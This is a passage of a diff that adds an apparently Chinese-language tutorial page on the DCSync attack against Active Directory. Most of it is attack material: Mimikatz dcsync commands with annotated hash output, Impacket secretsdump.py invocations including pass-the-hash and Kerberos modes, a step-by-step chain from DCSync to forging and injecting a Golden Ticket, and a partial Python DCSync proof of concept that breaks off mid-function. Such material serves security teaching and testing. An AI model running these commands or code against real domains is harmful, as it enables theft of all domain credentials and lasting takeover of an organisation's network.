+  <span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">IdentityReference</span><span class="p">,</span> <span class="n">ObjectType</span><span class="p">,</span> <span class="n">AceType</span>
+</code></pre></div>
+
+<p>输出示例：</p>
+<div class="highlight"><pre><span></span><code>IdentityReference              ObjectType                               AceType
+-----------------              ----------                               -------
+CORP\Domain Admins            1131f6ad-9c07-11d1-f79f-00c04fc2dab2      Allow
+CORP\Enterprise Admins        1131f6ad-9c07-11d1-f79f-00c04fc2dab2      Allow
+CORP\Exchange Windows Permi.. 1131f6ad-9c07-11d1-f79f-00c04fc2dab2      Allow
+CORP\MSOL_1a2b3c4d5e6f        1131f6ad-9c07-11d1-f79f-00c04fc2dab2      Allow
+</code></pre></div>
+
+<p>一旦发现 <code>Exchange Windows Permissions</code> 或 <code>MSOL_*</code> 账户，攻击路径就清晰了。</p>
+<hr />
+<h2>4. 攻击实战</h2>
+<h3>4.1 Mimikatz 完整命令序列与输出分析</h3>
+<p>Mimikatz 是 DCSync 的"原产地"，命令格式直观：</p>
+<div class="highlight"><pre><span></span><code># 提取单个用户 (krbtgt) 的哈希
+mimikatz # lsadump::dcsync /domain:corp.local /dc:dc01.corp.local /user:krbtgt
+</code></pre></div>
+
+<p>输出解析：</p>
+<div class="highlight"><pre><span></span><code>[DC] &#39;corp.local&#39; will be the domain
+[DC] &#39;dc01.corp.local&#39; will be the DC server
+[DC] &#39;krbtgt&#39; will be the user account
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 0x30000000 ( USER_OBJECT_ACCOUNT )
+User Principal Name  : krbtgt@corp.local
+Hex SID              : S-1-5-21-1234567890-1234567890-1234567890-502
+    -&gt; 502 = krbtgt 账户的固定 RID
+
+Credentials:
+  Hash NTLM          : 1f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                       这是 NTLM 哈希，可用于黄金票据/PtH
+
+    ntlm- 0: 1f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b
+    ntlm- 1: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6    &lt;- 历史密码哈希
+
+** SUPPLEMENTAL CREDENTIALS **
+
+Hash NTLM            : 1f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b
+
+* Primary:NTLM-Strong-NTOWF *
+    Random Value     : 1f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt      : CORP.LOCALkrbtgt
+    Default Iterations: 4096
+    Credentials:
+      aes256_hmac       (4096) : b8a9c7d6e5f4a3b2c1d0e9f8a7b6c5d4
+                                  e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8
+                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                                  AES-256 密钥，用于现代 Kerberos
+      aes128_hmac       (4096) : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+      des_cbc_md5       (4096) : a1b2c3d4e5f6a7b8
+
+* Primary:Kerberos *
+    Default Salt      : CORP.LOCALkrbtgt
+    Credentials:
+      aes256_hmac       : b8a9c7d6e5f4a3b2c1d0e9f8a7b6c5d4...
+      aes128_hmac       : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+      des_cbc_md5       : a1b2c3d4e5f6a7b8
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  1f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b
+    ...
+    29  1f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b
+</code></pre></div>
+
+<p>关键输出字段解读：</p>
+<ul>
+<li><code>Hash NTLM</code>：NTLM 哈希，用于 Pass-the-Hash、黄金票据（作为 krbtgt 加密密钥）。</li>
+<li><code>aes256_hmac</code>：Kerberos AES-256 密钥，可用于请求 TGT（更现代、更隐蔽）。</li>
+<li><code>Default Salt</code>：Kerberos 盐值 = <code>大写域名 + 用户名</code>，密钥派生需要。</li>
+<li><code>ntlm-1</code>：历史密码哈希（password history），可用于密码复用攻击。</li>
+</ul>
+<p>提取所有用户哈希：</p>
+<div class="highlight"><pre><span></span><code>mimikatz # lsadump::dcsync /domain:corp.local /all /csv
+</code></pre></div>
+
+<p><code>/all</code> 提取域内所有用户，<code>/csv</code> 输出为 CSV 格式，适合批量处理。</p>
+<h3>4.2 Impacket secretsdump.py 多参数模式</h3>
+<p>Impacket 的 <code>secretsdump.py</code> 是跨平台 DCSync 工具，支持多种认证方式和输出模式：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 模式1：使用密码认证，提取单个用户</span>
+secretsdump.py<span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt<span class="w"> </span>corp.local/user:Pass123!@dc01.corp.local
+
+<span class="c1"># 模式2：使用哈希认证 (Pass-the-Hash)</span>
+secretsdump.py<span class="w"> </span>-just-dc<span class="w"> </span>-hashes<span class="w"> </span>:1f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>corp.local/user@dc01.corp.local
+
+<span class="c1"># 模式3：使用 Kerberos 票据认证 (无密码/哈希)</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>user.ccache
+secretsdump.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-just-dc<span class="w"> </span>corp.local/user@dc01.corp.local
+
+<span class="c1"># 模式4：提取全部用户，仅哈希不输出历史</span>
+secretsdump.py<span class="w"> </span>-just-dc<span class="w"> </span>-user-status<span class="w"> </span>corp.local/user:Pass123!@dc01.corp.local
+
+<span class="c1"># 模式5：输出到文件，含 NTDS.dit 格式</span>
+secretsdump.py<span class="w"> </span>-just-dc<span class="w"> </span>-outputfile<span class="w"> </span>corp_hashes<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>corp.local/user:Pass123!@dc01.corp.local
+<span class="c1"># 生成 corp_hashes.ntds (哈希), corp_hashes.kerberos (密钥)</span>
+</code></pre></div>
+
+<p>参数详解：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+<th>使用场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-just-dc</code></td>
+<td>仅执行 DCSync（不读 SAM/LSA）</td>
+<td>远程攻击，不落地 DC</td>
+</tr>
+<tr>
+<td><code>-just-dc-user</code></td>
+<td>仅提取指定用户</td>
+<td>精准打击（如 krbtgt）</td>
+</tr>
+<tr>
+<td><code>-just-dc-ntlm</code></td>
+<td>仅输出 NTLM 哈希</td>
+<td>减少噪音，专做 PtH</td>
+</tr>
+<tr>
+<td><code>-user-status</code></td>
+<td>标注账户启用/禁用状态</td>
+<td>筛选活跃账户</td>
+</tr>
+<tr>
+<td><code>-history</code></td>
+<td>包含密码历史</td>
+<td>密码复用分析</td>
+</tr>
+<tr>
+<td><code>-k -no-pass</code></td>
+<td>使用 Kerberos 认证</td>
+<td>隐蔽，无密码落盘</td>
+</tr>
+<tr>
+<td><code>-hashes</code></td>
+<td>使用 NTLM 哈希认证</td>
+<td>PtH 横向后继续 DCSync</td>
+</tr>
+<tr>
+<td><code>-outputfile</code></td>
+<td>输出到文件</td>
+<td>批量提取，离线分析</td>
+</tr>
+<tr>
+<td><code>-exec-method</code></td>
+<td>指定执行方法</td>
+<td>非 DCSync 模式时用</td>
+</tr>
+</tbody>
+</table>
+<h3>4.3 从 DCSync 到 Golden Ticket 完整攻击链</h3>
+<p>Golden Ticket 攻击的核心是伪造 krbtgt 账户签发的 TGT。拿到 krbtgt 哈希后，攻击者可以伪造任意用户的 TGT，实现完全的域控制持久化。</p>
+<p>完整攻击链：</p>
+<div class="highlight"><pre><span></span><code><span class="err">步骤</span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="err">获取</span><span class="w"> </span><span class="n">DCSync</span><span class="w"> </span><span class="err">权限账户凭据</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="o">(</span><span class="err">通过钓鱼</span><span class="sr">/横向移动/</span><span class="n">Exchange滥用</span><span class="o">)</span>
+<span class="w">  </span><span class="err">▼</span>
+<span class="err">步骤</span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="err">执行</span><span class="w"> </span><span class="n">DCSync</span><span class="w"> </span><span class="err">提取</span><span class="w"> </span><span class="n">krbtgt</span><span class="w"> </span><span class="err">哈希</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">secretsdump</span><span class="o">.</span><span class="na">py</span><span class="w"> </span><span class="o">-</span><span class="n">just</span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">user</span><span class="w"> </span><span class="n">krbtgt</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">Hash</span><span class="w"> </span><span class="n">NTLM</span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="n">f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">aes256_hmac</span><span class="o">:</span><span class="w"> </span><span class="n">b8a9c7d6e5f4</span><span class="o">...</span>
+<span class="w">  </span><span class="err">▼</span>
+<span class="err">步骤</span><span class="mi">3</span><span class="o">:</span><span class="w"> </span><span class="err">伪造黄金票据</span><span class="w"> </span><span class="o">(</span><span class="err">伪造</span><span class="w"> </span><span class="n">Domain</span><span class="w"> </span><span class="n">Admin</span><span class="w"> </span><span class="err">的</span><span class="w"> </span><span class="n">TGT</span><span class="o">)</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">Mimikatz</span><span class="o">:</span><span class="w"> </span><span class="n">kerberos</span><span class="o">::</span><span class="n">golden</span><span class="w"> </span><span class="o">/</span><span class="n">user</span><span class="o">:</span><span class="n">Administrator</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="sr">/domain:corp.local /si</span><span class="n">d</span><span class="o">:</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="n">xxx</span><span class="o">-</span><span class="mi">502</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="sr">/krbtgt:1f3d2a8c... /</span><span class="n">ticket</span><span class="o">:</span><span class="n">golden</span><span class="o">.</span><span class="na">kirbi</span>
+<span class="w">  </span><span class="err">▼</span>
+<span class="err">步骤</span><span class="mi">4</span><span class="o">:</span><span class="w"> </span><span class="err">注入票据到当前会话</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">Mimikatz</span><span class="o">:</span><span class="w"> </span><span class="n">kerberos</span><span class="o">::</span><span class="n">ptt</span><span class="w"> </span><span class="n">golden</span><span class="o">.</span><span class="na">kirbi</span>
+<span class="w">  </span><span class="err">▼</span>
+<span class="err">步骤</span><span class="mi">5</span><span class="o">:</span><span class="w"> </span><span class="err">以域管身份访问任意服务</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="o">\\</span><span class="n">dc01</span><span class="o">.</span><span class="na">corp</span><span class="o">.</span><span class="na">local</span><span class="o">\</span><span class="n">c$</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">psexec</span><span class="w"> </span><span class="o">\\</span><span class="n">dc01</span><span class="o">.</span><span class="na">corp</span><span class="o">.</span><span class="na">local</span><span class="w"> </span><span class="n">cmd</span>
+<span class="w">  </span><span class="err">▼</span>
+<span class="err">步骤</span><span class="mi">6</span><span class="o">:</span><span class="w"> </span><span class="err">持久化</span><span class="w"> </span><span class="o">(</span><span class="err">即使</span><span class="w"> </span><span class="n">krbtgt</span><span class="w"> </span><span class="err">密码被重置</span><span class="o">)</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">黄金票据有效期默认</span><span class="mi">10</span><span class="err">年</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">需要两次重置</span><span class="w"> </span><span class="n">krbtgt</span><span class="w"> </span><span class="err">密码才能完全失效</span>
+</code></pre></div>
+
+<p>Mimikatz 黄金票据命令：</p>
+<div class="highlight"><pre><span></span><code>mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
+  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
+  /krbtgt:1f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b \
+  /id:500 /groups:513,512,520,518,519 \
+  /ticket:golden.kirbi /ptt
+</code></pre></div>
+
+<p>参数说明：
+- <code>/user:Administrator</code>：伪造的用户名（任意，DC 不验证用户是否存在）
+- <code>/sid</code>：域 SID（从 DCSync 输出获取）
+- <code>/krbtgt</code>：krbtgt 的 NTLM 哈希（DCSync 提取）
+- <code>/id:500</code>：RID，500 是默认 Administrator
+- <code>/groups</code>：附加组 SID（513=Domain Users, 512=Domain Admins）
+- <code>/ptt</code>：Pass-the-ticket，直接注入</p>
+<h3>4.4 简化版 DCSync Python PoC</h3>
+<p>以下是一个基于 Impacket 库的简化版 DCSync PoC，展示核心协议调用逻辑：</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">简化版 DCSync PoC - 演示 MS-DRSR 协议调用逻辑</span>
+<span class="sd">仅用于授权安全测试和教育目的</span>
+<span class="sd">依赖: impacket (pip install impacket)</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">from</span><span class="w"> </span><span class="nn">impacket.dcerpc.v5</span><span class="w"> </span><span class="kn">import</span> <span class="n">transport</span><span class="p">,</span> <span class="n">drsuapi</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">impacket.dcerpc.v5.dtypes</span><span class="w"> </span><span class="kn">import</span> <span class="n">NULL</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">impacket.smbconnection</span><span class="w"> </span><span class="kn">import</span> <span class="n">SessionError</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">impacket.nt_errors</span><span class="w"> </span><span class="kn">import</span> <span class="n">STATUS_MORE_ENTRIES</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="c1"># DRSUAPI 接口 UUID</span>
+<span class="n">DRSUAPI_UUID</span> <span class="o">=</span> <span class="n">drsuapi</span><span class="o">.</span><span class="n">MSRPC_UUID_DRSUAPI</span>
+
+<span class="c1"># 机密属性的 OID (Object Identifier)</span>
+<span class="c1"># 这些属性的 schemaIDGUID 用于请求复制时标识</span>
+<span class="n">SECRET_ATTRIBUTES</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;unicodePwd&#39;</span><span class="p">:</span>          <span class="s1">&#39;1.2.840.113556.1.4.90&#39;</span><span class="p">,</span>   <span class="c1"># NTLM 哈希</span>
+    <span class="s1">&#39;dBCSPwd&#39;</span><span class="p">:</span>             <span class="s1">&#39;1.2.840.113556.1.4.90&#39;</span><span class="p">,</span>   <span class="c1"># LM 哈希(旧)</span>
+    <span class="s1">&#39;ntPwdHistory&#39;</span><span class="p">:</span>        <span class="s1">&#39;1.2.840.113556.1.4.94&#39;</span><span class="p">,</span>   <span class="c1"># NTLM 历史</span>
+    <span class="s1">&#39;lmPwdHistory&#39;</span><span class="p">:</span>        <span class="s1">&#39;1.2.840.113556.1.4.94&#39;</span><span class="p">,</span>   <span class="c1"># LM 历史</span>
+    <span class="s1">&#39;supplementalCredentials&#39;</span><span class="p">:</span> <span class="s1">&#39;1.2.840.113556.1.4.125&#39;</span><span class="p">,</span> <span class="c1"># Kerberos/WDigest</span>
+    <span class="s1">&#39;kerberos-newer-encryption-key&#39;</span><span class="p">:</span> <span class="s1">&#39;1.2.840.113556.1.4.118&#39;</span><span class="p">,</span>
+<span class="p">}</span>
+
+
+<span class="k">class</span><span class="w"> </span><span class="nc">MiniDCSync</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;简化版 DCSync 实现&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">dc_ip</span><span class="p">,</span>
+                 <span class="n">hashes</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">nthash</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">aes_key</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">domain</span> <span class="o">=</span> <span class="n">domain</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dc_ip</span> <span class="o">=</span> <span class="n">dc_ip</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">hashes</span> <span class="o">=</span> <span class="n">hashes</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">nthash</span> <span class="o">=</span> <span class="n">nthash</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">aes_key</span> <span class="o">=</span> <span class="n">aes_key</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">drs</span> <span class="o">=</span> <span class="kc">None</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">hDrs</span> <span class="o">=</span> <span class="n">NULL</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dce</span> <span class="o">=</span> <span class="kc">None</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">_get_rpc_transport</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;建立到 DRSUAPI 端点的 RPC 传输&quot;&quot;&quot;</span>
+        <span class="c1"># 使用 ncacn_ip_tcp 直连 DRSUAPI 动态端口</span>
+        <span class="c1"># 正常流程: 先通过 EPM(135) 解析端口</span>
+        <span class="c1"># 这里简化: 使用 DRSUAPI 默认绑定方式</span>
+        <span class="n">string_binding</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;ncacn_ip_tcp:</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">dc_ip</span><span class="si">}</span><span class="s1">&#39;</span>
+        <span class="n">rpctransport</span> <span class="o">=</span> <span class="n">transport</span><span class="o">.</span><span class="n">DCERPCTransportFactory</span><span class="p">(</span><span class="n">string_binding</span><span class="p">)</span>
+        <span class="n">rpctransport</span><span class="o">.</span><span class="n">set_credentials</span><span class="p">(</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">password</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">domain</span><span class="p">,</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">hashes</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">aes_key</span>
+        <span class="p">)</span>
+        <span class="k">return</span> <span class="n">rpctransport</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;建立 DRSUAPI 会话 (IDL_DRSBind)&quot;&quot;&quot;</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 连接到 DC: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">dc_ip</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">rpctransport</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_rpc_transport</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dce</span> <span class="o">=</span> <span class="n">rpctransport</span><span class="o">.</span><span class="n">get_dce_rpc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dce</span><span class="o">.</span><span class="n">set_auth_level</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>  <span class="c1"># RPC_C_AUTHN_LEVEL_PKT_PRIVACY (sealing)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dce</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dce</span><span class="o">.</span><span class="n">bind</span><span class="p">(</span><span class="n">DRSUAPI_UUID</span><span class="p">)</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;[+] RPC 绑定成功 (DRSUAPI)&quot;</span><span class="p">)</span>
+
+        <span class="c1"># 构造 DRSBind 请求</span>
+        <span class="n">request</span> <span class="o">=</span> <span class="n">drsuapi</span><span class="o">.</span><span class="n">DRSBind</span><span class="p">()</span>
+        <span class="n">request</span><span class="p">[</span><span class="s1">&#39;puuidClientDsa&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">drsuapi</span><span class="o">.</span><span class="n">DRSUAPI_DS_GUID</span>
+        <span class="n">request</span><span class="p">[</span><span class="s1">&#39;pextClient&#39;</span><span class="p">][</span><span class="s1">&#39;cb&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">100</span>  <span class="c1"># 客户端扩展大小</span>
+        <span class="n">request</span><span class="p">[</span><span class="s1">&#39;pextClient&#39;</span><span class="p">][</span><span class="s1">&#39;dwFlags&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="n">drsuapi</span><span class="o">.</span><span class="n">DRSUAPI_EXT_FLAG_BASE</span> <span class="o">|</span>
+            <span class="n">drsuapi</span><span class="o">.</span><span class="n">DRSUAPI_EXT_FLAG_ASYNCREPL</span>
+        <span class="p">)</span>
+        <span class="n">request</span><span class="p">[</span><span class="s1">&#39;pextClient&#39;</span><span class="p">][</span><span class="s1">&#39;dwReplEpoch&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">request</span><span class="p">[</span><span class="s1">&#39;pextClient&#39;</span><span class="p">][</span><span class="s1">&#39;dwFlagsExt&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+
+        <span class="n">resp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dce</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">hDrs</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="s1">&#39;phDrs&#39;</span><span class="p">]</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;[+] IDL_DRSBind 成功, 获得 hDrs 句柄&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">resp</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">get_nc_changes</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_dn</span><span class="p">,</span> <span class="n">invocation_id</span><span class="p">,</span> <span class="n">usn_from</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        IDL_DRSGetNCChanges - 请求 NC 变更数据</span>
+<span class="sd">        target_dn: 目标对象 DN (如 CN=krbtgt,CN=Users,DC=corp,DC=local)</span>
+<span class="sd">        invocation_id: 源 DC 的 invocationId (从 DRSBind 响应获取)</span>
+<span class="sd">        usn_from: USN 起始点 (0 = 全量)</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">request</span> <span class="o">=</span> <span class="n">drsuapi</span><span class="o">.</span><span class="n">DRSGetNCChanges</span><span class="p">()</span>
+        <span class="n">request</span><span class="p">[</span><span class="s1">&#39;hDrs&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">hDrs</span>
+        <span class="n">request</span><span class="p">[</span><span class="s1">&#39;dwInVersion&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">8</span>  <span class="c1"># DRSGetNCChanges 版本 8</span>
+
+        <span class="c1"># 构造请求消息</span>
+        <span class="n">msgIn</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s1">&#39;pmsgIn&#39;</span><span class="p">]</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;uuidDsaObjDest&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">invocation_id</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;uuidInvocIdSrc&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">invocation_id</span>
+
+        <span class="c1"># 指定目标 NC (Naming Context)</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;pNc&#39;</span><span class="p">][</span><span class="s1">&#39;DNT&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># 将通过 DN 解析</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;pNc&#39;</span><span class="p">][</span><span class="s1">&#39;StringName&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">target_dn</span>
+
+        <span class="c1"># USN 向量 - 从 0 开始表示全量拉取</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;usnvecFrom&#39;</span><span class="p">][</span><span class="s1">&#39;usnHighObjUpdate&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">usn_from</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;usnvecFrom&#39;</span><span class="p">][</span><span class="s1">&#39;usnHighPropUpdate&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">usn_from</span>
+
+        <span class="c1"># 请求包含机密属性</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;ulFlags&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="n">drsuapi</span><span class="o">.</span><span class="n">DRSUAPI_DRS_GET_NC_SIZE</span> <span class="o">|</span>
+            <span class="n">drsuapi</span><span class="o">.</span><span class="n">DRSUAPI_DRS_GET_ALL_GROUP_MEMBERSHIP</span>
+        <span class="p">)</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;cMaxObjects&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>  <span class="c1"># 每次请求 1 个对象</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;cMaxBytes&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
+        <span class="n">msgIn</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;ulExtendedOp&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">dce</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] IDL_DRSGetNCChanges 成功&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">resp</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[-] DRSGetNCChanges 失败: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">raise</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">parse_replentin</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">resp</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        解析 REPLENTIN 响应, 提取密码哈希</span>
+<span class="sd">        REPLENTIN 包含 ENTINF (Entry Information) 列表</span>
+<span class="sd">        每个 ENTINF 包含对象的属性值</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">pmsgOut</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="s1">&#39;pmsgOut&#39;</span><span class="p">]</span>
+        <span class="c1"># 获取返回的对象数量</span>
+        <span class="n">cNumObjects</span> <span class="o">=</span> <span class="n">pmsgOut</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;cNumObjects&#39;</span><span class="p">]</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">cNumObjects</span><span class="p">):</span>
